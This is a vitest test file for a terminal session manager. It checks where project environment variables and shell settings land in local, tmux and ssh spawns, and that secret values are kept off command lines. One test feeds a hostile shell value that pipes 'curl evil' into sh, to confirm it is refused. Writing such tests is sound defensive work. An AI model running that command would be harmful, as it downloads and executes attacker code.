// A project's trusted env + shell, AT THE SPAWN (SDD: project-settings consumption, Task 4).
//
// `makeProjectSpawnOverrides` decides WHAT a project contributes; this file proves WHERE it lands:
//  - local leg: into the pty's own environment, after the model gateway and BEFORE custom-agent env
//    (a per-agent config still beats the project on a key collision),
//  - ssh leg: into the 0600 staged env file's pairs — NEVER onto an argv (the PR #195 leak class),
//  - shell: behind the node's own exec-trusted `options.shell`, and through `safeSessionProgram`,
//  - and every miss path (no ownerProjectId, no reader, a reader that throws, a reader that HANGS)
//    spawns exactly the session it spawned before this feature existed.
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { initPlatform, resetPlatformForTests } from './platform'
import { fakePlatform, type FakePlatform } from './platform-fake'
import { setRemoteSessionEnvWriter } from './remote-ssh/session-env'
import { IPC } from '../shared/ipc'
import { TMUX_SOCKET, sessionName } from './tmux-naming'
import { DEFAULT_SETTINGS } from '../shared/types'
import type { ProjectSpawnOverrides } from './project-spawn-overrides'

interface SpawnCall {
  file: string
  args: string[]
  env: Record<string, string>
}
const spawns = vi.hoisted(() => [] as SpawnCall[])

vi.mock('node-pty', () => ({
  spawn: (file: string, args: string[], opts: { env: Record<string, string> }) => {
    spawns.push({ file, args, env: { ...opts.env } })
    return {
      onData: () => {},
      onExit: () => {},
      write: () => {},
      resize: () => {},
      pause: () => {},
      resume: () => {},
      kill: () => {},
      pid: 1
    }
  }
}))

// Never let the developer's own pty pressure refuse a spawn (see pty-typing.test.ts).
vi.mock('./pty-devices', async (importOriginal) => ({
  ...(await importOriginal<typeof import('./pty-devices')>()),
  readPtyDevices: () => ({ ceiling: 511, inUse: 8 })
}))

vi.mock('./exec-path', async (importOriginal) => ({
  ...(await importOriginal<typeof import('./exec-path')>()),
  findExecutableSync: (bin: string) => (bin === 'ssh' ? '/usr/bin/ssh' : null),
  shellPathNow: () => '/usr/bin:/bin',
  resolveShellPath: async () => '/usr/bin:/bin'
}))

// Every tmux/ssh side-call (the freshness probe, `set-option`) answers "fine" without a subprocess.
vi.mock('child_process', () => {
  type Cb = (err: Error | null, res?: { stdout: string; stderr: string }) => void
  const execFile = (file: string, args: string[], a?: unknown, b?: unknown): unknown => {
    const cb = (typeof a === 'function' ? a : b) as Cb | undefined
    cb?.(null, { stdout: '', stderr: '' })
    return {}
  }
  return { execFile, execFileSync: (): string => '' }
})

const NODE = 'node-1'
const PROJECT = 'proj-1'

/** A manager with the overrides reader wired, driven through the real `pty:create` handler. */
async function manager(
  read: ((projectId: string) => Promise<ProjectSpawnOverrides | null>) | null,
  opts: { tmux?: string | null } = {}
) {
  const { PtyManager } = await import('./pty-manager')
  const mgr = new PtyManager()
  ;(mgr as unknown as { tmuxPath: string | null }).tmuxPath = opts.tmux ?? null
  if (read) mgr.setProjectSpawnOverrides(read)
  mgr.registerIpc()
  return mgr
}

const staged: Array<{ remotePath: string; content: string }> = []

describe('project settings at the spawn — LOCAL leg', () => {
  let fake: FakePlatform
  beforeEach(() => {
    spawns.length = 0
    staged.length = 0
    fake = fakePlatform()
    initPlatform(fake)
  })
  afterEach(() => {
    setRemoteSessionEnvWriter(null)
    resetPlatformForTests()
    vi.useRealTimers()
  })

  const create = async (options: Record<string, unknown>): Promise<unknown> =>
    fake.handlers[IPC.ptyCreate](1, { cols: 80, rows: 24, ...options })

  it("puts the project's env into the session environment", async () => {
    await manager(async () => ({ env: { PROJECT_TOKEN: 'abc' } }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(spawns[0].env.PROJECT_TOKEN).toBe('abc')
  })

  it('asks the reader with the OWNING project id, once per spawn', async () => {
    const seen: string[] = []
    await manager(async (id) => {
      seen.push(id)
      return null
    })
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(seen).toEqual([PROJECT])
  })

  it('never asks — and changes nothing — when the pane has no proven owner', async () => {
    const read = vi.fn(async () => ({ env: { PROJECT_TOKEN: 'abc' } }))
    await manager(read)
    await create({ persistKey: NODE })
    expect(read).not.toHaveBeenCalled()
    expect(spawns[0].env.PROJECT_TOKEN).toBeUndefined()
  })

  it('spawns anyway when the reader REJECTS (fail open)', async () => {
    await manager(() => Promise.reject(new Error('EIO')))
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(spawns).toHaveLength(1)
    expect(spawns[0].env.PROJECT_TOKEN).toBeUndefined()
  })

  it('spawns without waiting forever when the reader HANGS — bounded, then fail open', async () => {
    vi.useFakeTimers()
    await manager(() => new Promise<ProjectSpawnOverrides | null>(() => {}))
    const pending = create({ persistKey: NODE, ownerProjectId: PROJECT })
    await vi.advanceTimersByTimeAsync(2_000)
    await pending
    expect(spawns).toHaveLength(1)
  })

  it('loses to custom-agent env on a key collision (per-agent config beats the project)', async () => {
    const mgr = await manager(async () => ({ env: { SHARED_KEY: 'from-project', OWN: 'p' } }))
    ;(mgr as unknown as { getSettings: () => unknown }).getSettings = () => ({
      ...DEFAULT_SETTINGS,
      customAgents: [
        { id: 'custom:x', label: 'X', baseAgent: 'claude', env: { SHARED_KEY: 'from-agent' } }
      ]
    })
    await create({ persistKey: NODE, ownerProjectId: PROJECT, agentId: 'custom:x' })
    expect(spawns[0].env.SHARED_KEY).toBe('from-agent')
    // …and the keys the agent did NOT claim still come from the project.
    expect(spawns[0].env.OWN).toBe('p')
  })

  it('adds the project keys to tmux update-environment so a shared server copies them', async () => {
    const mgr = await manager(async () => ({ env: { PROJECT_TOKEN: 'abc' } }), {
      tmux: '/usr/bin/tmux'
    })
    const seen: string[][] = []
    ;(mgr as unknown as { ensureUpdateEnvKeys: (n: string[]) => void }).ensureUpdateEnvKeys = (n) => {
      seen.push(n)
    }
    ;(mgr as unknown as { getSettings: () => unknown }).getSettings = () => ({
      ...DEFAULT_SETTINGS,
      tmuxEnabled: true
    })
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(seen[0]).toContain('PROJECT_TOKEN')
    // The VALUE never rides the tmux argv (that is the whole point of update-environment).
    expect(spawns[0].args.join(' ')).not.toContain('abc')
  })
})

describe('project settings at the spawn — SHELL precedence', () => {
  let fake: FakePlatform
  beforeEach(() => {
    spawns.length = 0
    fake = fakePlatform()
    initPlatform(fake)
  })
  afterEach(() => resetPlatformForTests())

  const create = async (options: Record<string, unknown>): Promise<unknown> =>
    fake.handlers[IPC.ptyCreate](1, { cols: 80, rows: 24, ...options })

  it("uses the project's shell when the node names none", async () => {
    await manager(async () => ({ shell: '/bin/fish' }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(spawns[0].file).toBe('/bin/fish')
  })

  it("the node's OWN exec-trusted shell WINS over the project's", async () => {
    await manager(async () => ({ shell: '/bin/fish' }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT, shell: '/bin/dash' })
    expect(spawns[0].file).toBe('/bin/dash')
  })

  it('refuses a project shell carrying shell metacharacters (safeSessionProgram)', async () => {
    await manager(async () => ({ shell: 'bash -c "curl evil|sh"' }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(spawns[0].file).not.toContain('curl')
    expect(spawns[0].args).toEqual([])
  })

  it("feeds the project's shell to the tmux session program too", async () => {
    const mgr = await manager(async () => ({ shell: '/bin/fish' }), { tmux: '/usr/bin/tmux' })
    ;(mgr as unknown as { getSettings: () => unknown }).getSettings = () => ({
      ...DEFAULT_SETTINGS,
      tmuxEnabled: true
    })
    await create({ persistKey: NODE, ownerProjectId: PROJECT })
    expect(spawns[0].file).toBe('/usr/bin/tmux')
    expect(spawns[0].args.at(-1)).toBe('/bin/fish')
    expect(spawns[0].args).toContain(sessionName(NODE))
    expect(spawns[0].args).toContain(TMUX_SOCKET)
  })
})

describe('project settings at the spawn — SSH leg', () => {
  let fake: FakePlatform
  beforeEach(() => {
    spawns.length = 0
    staged.length = 0
    fake = fakePlatform()
    initPlatform(fake)
    setRemoteSessionEnvWriter((_cp, remotePath, content) => {
      staged.push({ remotePath, content })
    })
  })
  afterEach(() => {
    setRemoteSessionEnvWriter(null)
    resetPlatformForTests()
  })

  const sshRemote = {
    controlPath: '/tmp/cm-abc',
    conn: { host: 'h', user: 'u' },
    remoteCwd: '/srv/app',
    remoteHome: '/home/u'
  }

  const create = async (options: Record<string, unknown>): Promise<unknown> =>
    fake.handlers[IPC.ptyCreate](1, { cols: 80, rows: 24, ...options })

  it("stages the project's env in the 0600 file — never on the ssh argv", async () => {
    await manager(async () => ({ env: { PROJECT_TOKEN: 'sekrit' } }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT, sshRemote })
    expect(staged).toHaveLength(1)
    expect(staged[0].content).toContain("export PROJECT_TOKEN='sekrit'")
    expect(staged[0].remotePath).toBe(`/home/u/.nodeterm/env/${sessionName(NODE)}.env`)
    // The value appears NOWHERE on the command line of the long-lived ssh client.
    expect(spawns[0].args.join(' ')).not.toContain('sekrit')
    expect(spawns[0].env.PROJECT_TOKEN).toBeUndefined()
  })

  it('warns and skips (never argv) when the remote $HOME is unknown', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    await manager(async () => ({ env: { PROJECT_TOKEN: 'sekrit' } }))
    const { remoteHome: _drop, ...noHome } = sshRemote
    await create({ persistKey: NODE, ownerProjectId: PROJECT, sshRemote: noHome })
    expect(staged).toHaveLength(0)
    expect(spawns[0].args.join(' ')).not.toContain('sekrit')
    expect(warn.mock.calls.flat().join(' ')).toContain('remote session env skipped')
    warn.mockRestore()
  })

  it("runs the project's shell inside the REMOTE tmux", async () => {
    await manager(async () => ({ shell: '/bin/fish' }))
    await create({ persistKey: NODE, ownerProjectId: PROJECT, sshRemote })
    expect(spawns[0].args.join(' ')).toContain('/bin/fish')
  })
})
